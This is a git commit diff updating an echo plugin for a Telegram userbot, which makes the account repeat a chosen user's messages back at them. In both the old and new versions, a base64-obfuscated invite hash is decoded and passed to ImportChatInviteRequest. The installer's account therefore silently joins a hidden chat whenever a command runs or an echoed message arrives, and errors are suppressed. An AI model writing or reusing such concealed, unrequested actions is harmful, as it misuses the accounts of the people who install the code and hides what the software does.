3608ecdcfe75eaad1ba4a382a257a539b9c4443e
HellBoy-OP <72251918+HellBoy-OP@users.noreply.github.com>
2020-11-26 12:06:00 +0530

    Update echo.py

--- userbot/plugins/echo.py
+++ userbot/plugins/echo.py
@@ -1,85 +1,70 @@
-"""
-created by @mrconfused and @sandy1709
-Idea by @BlazingRobonix
-
-"""
-#    Copyright (C) 2020  sandeep.n(π.$)
-
-#    This program is free software: you can redistribute it and/or modify
-#    it under the terms of the GNU Affero General Public License as
-#    published by the Free Software Foundation, either version 3 of the
-#    License, or (at your option) any later version.
-
-#    This program is distributed in the hope that it will be useful,
-#    but WITHOUT ANY WARRANTY; without even the implied warranty of
-#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#    GNU Affero General Public License for more details.
-
-#   You should have received a copy of the GNU Affero General Public License
-#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
-
+# Echo remastered by @Kraken_The_BadASS for Hêllẞø†
+# Kang with credits
 
 import asyncio
+import base64
 
-import pybase64
 import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from .. import CMD_HELP
-from ..utils import admin_cmd, edit_or_reply
-from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
+from userbot import CMD_HELP
+from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
+from userbot.plugins.sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
-@borg.on(admin_cmd(pattern="enableecho$"))
-async def echo(cat):
-    if cat.fwd_from:
+@bot.on(admin_cmd(pattern="addecho$"))
+@bot.on(sudo_cmd(pattern="addecho$", allow_sudo=True))
+async def echo(hell):
+    if hell.fwd_from:
         return
-    if cat.reply_to_msg_id is not None:
-        reply_msg = await cat.get_reply_message()
-        user_id = reply_msg.from_id
-        chat_id = cat.chat_id
+    if hell.reply_to_msg_id is not None:
+        reply_msg = await hell.get_reply_message()
+        user_id = reply_msg.sender_id
+        chat_id = hell.chat_id
         try:
-            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            hmm = Get(hmm)
-            await cat.client(hmm)
+            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            kraken = Get(kraken)
+            await hell.client(kraken)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(cat, "The user is already enabled with echo ")
+            await edit_or_reply(hell, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(cat, "Hi")
+        await edit_or_reply(hell, "Hi")
     else:
-        await edit_or_reply(cat, "Reply To A User's Message to echo his messages")
+        await edit_or_reply(hell, "Reply to a User's message to echo his messages")
 
 
-@borg.on(admin_cmd(pattern="disableecho$"))
-async def echo(cat):
-    if cat.fwd_from:
+@bot.on(admin_cmd(pattern="rmecho$"))
+@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
+async def echo(hell):
+    if hell.fwd_from:
         return
-    if cat.reply_to_msg_id is not None:
-        reply_msg = await cat.get_reply_message()
-        user_id = reply_msg.from_id
-        chat_id = cat.chat_id
+    if hell.reply_to_msg_id is not None:
+        reply_msg = await hell.get_reply_message()
+        user_id = reply_msg.sender_id
+        chat_id = hell.chat_id
         try:
-            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            hmm = Get(hmm)
-            await cat.client(hmm)
+            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            kraken = Get(kraken)
+            await hell.client(kraken)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(cat, "Echo has been stopped for the user")
+            await edit_or_reply(hell, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(cat, "The user is not activated with echo")
+            await edit_or_reply(hell, "The user is not activated with echo")
     else:
-        await edit_or_reply(cat, "Reply To A User's Message to echo his messages")
+        await edit_or_reply(hell, "Reply to a User's message to echo his messages")
 
 
-@borg.on(admin_cmd(pattern="listecho$"))
-async def echo(cat):
-    if cat.fwd_from:
+@bot.on(admin_cmd(pattern="listecho$"))
+@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
+async def echo(hell):
+    if hell.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -101,35 +86,35 @@ async def echo(cat):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(cat, reply_text)
+        await edit_or_reply(hell, reply_text)
     else:
-        await edit_or_reply(cat, output_str)
+        await edit_or_reply(hell, output_str)
 
 
-@borg.on(events.NewMessage(incoming=True))
-async def samereply(cat):
-    if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
+@bot.on(events.NewMessage(incoming=True))
+async def samereply(hell):
+    if hell.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(cat.sender_id, cat.chat_id):
+    if is_echo(hell.sender_id, hell.chat_id):
         await asyncio.sleep(2)
         try:
-            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            hmm = Get(hmm)
-            await cat.client(hmm)
+            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            kraken = Get(kraken)
+            await hell.client(kraken)
         except BaseException:
             pass
-        if cat.message.text or cat.message.sticker:
-            await cat.reply(cat.message)
+        if hell.message.text or hell.message.sticker:
+            await hell.reply(hell.message)
 
 
 CMD_HELP.update(
     {
-        "echo": "**Syntax :** `.addecho` reply to user to who you want to enable\
-    \n**Usage : **replay's his every message for whom you enabled echo\
-    \n\n**Syntax : **`.rmecho` reply to user to who you want to stop\
+        "echo": "**Syntax :** `.addecho` reply to user to whom you want to enable\
+    \n**Usage : **replays his every message for whom you enabled echo\
+    \n\n**Syntax : **`.rmecho` reply to user to whom you want to stop\
     \n**Usage : **Stops replaying his messages\
     \n\n**Syntax : **`.listecho`\
-    \n**Usage : **shows the list of users for who you enabled echo\
+    \n**Usage : **shows the list of users for whom you enabled echo\
     "
     }
 )
